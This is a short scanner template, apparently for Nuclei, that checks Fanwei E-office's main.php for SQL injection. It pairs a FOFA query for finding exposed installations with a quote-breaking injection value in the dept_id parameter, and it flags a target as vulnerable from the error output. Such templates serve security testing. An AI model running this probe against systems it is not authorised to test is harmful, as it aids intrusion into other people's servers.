id: fanwei-e-office-main-sqli

info:
  name: Fanwei E-office Main.php Sqli
  author: zp857
  severity: high
  reference: https://moresec.yuque.com/iixlqz/wnv3e6/hglxt5
  tags: fanwei-e-office,sqli
  metadata:
    fofa-query: 'body="/general/login/index.php" || body="/general/login/view/css/login.css" || header="/general/login/index.php"'

requests:
  - raw:
      - |
        GET /userselect/main.php?dept_id=1%27"&diff=alldept HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Warning"

      - type: status
        status:
          - 200
